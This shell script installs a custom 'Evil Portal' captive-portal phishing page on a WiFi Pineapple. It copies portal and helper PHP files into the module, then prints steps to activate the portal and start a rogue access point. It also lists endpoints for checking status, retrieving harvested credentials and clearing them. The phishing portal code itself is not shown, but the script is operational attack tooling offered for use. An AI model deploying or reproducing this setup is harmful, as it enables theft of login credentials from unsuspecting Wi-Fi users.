#!/bin/sh
# Evil Portal Universal v3.1 - Pineapple Installer
# Run this script ON the WiFi Pineapple via SSH

MODULE="/root/pineapple/modules/EvilPortal"
PORTALS="$MODULE/portals"

echo "========================================"
echo "  Evil Portal Universal v3.1 Installer"
echo "========================================"
echo ""

# Check if Evil Portal module is installed
if [ ! -d "$MODULE" ]; then
    echo "[!] ERROR: Evil Portal module not found at $MODULE"
    echo "[!] Please install 'Evil Portal' from the Pineapple Module Manager first."
    echo "    Web UI -> Modules -> Manage Modules -> Install 'Evil Portal'"
    exit 1
fi

# Create directories
mkdir -p "$PORTALS"
mkdir -p "$MODULE/logs"

# Copy files
cp MyPortal.php "$PORTALS/"
cp helper.php "$MODULE/"

# Set permissions
chmod 644 "$PORTALS/MyPortal.php"
chmod 644 "$MODULE/helper.php"
chmod 755 "$MODULE/logs"

echo "[+] MyPortal.php copied to: $PORTALS/MyPortal.php"
echo "[+] helper.php copied to:   $MODULE/helper.php"
echo ""
echo "========================================"
echo "  NEXT STEPS:"
echo "========================================"
echo ""
echo "  1. Open Pineapple Web UI:"
echo "     http://172.16.42.1:1471/"
echo ""
echo "  2. Go to: Modules -> Evil Portal"
echo ""
echo "  3. Click 'Portal Library'"
echo ""
echo "  4. Select 'MyPortal' and click 'Activate'"
echo ""
echo "  5. Start your AP and test!"
echo ""
echo "========================================"
echo "  API ENDPOINTS:"
echo "========================================"
echo ""
echo "  Status:  http://172.16.42.1/captiveportal/helper.php?action=status"
echo "  Creds:   http://172.16.42.1/captiveportal/helper.php?action=creds"
echo "  Clear:   http://172.16.42.1/captiveportal/helper.php?action=clear"
echo ""
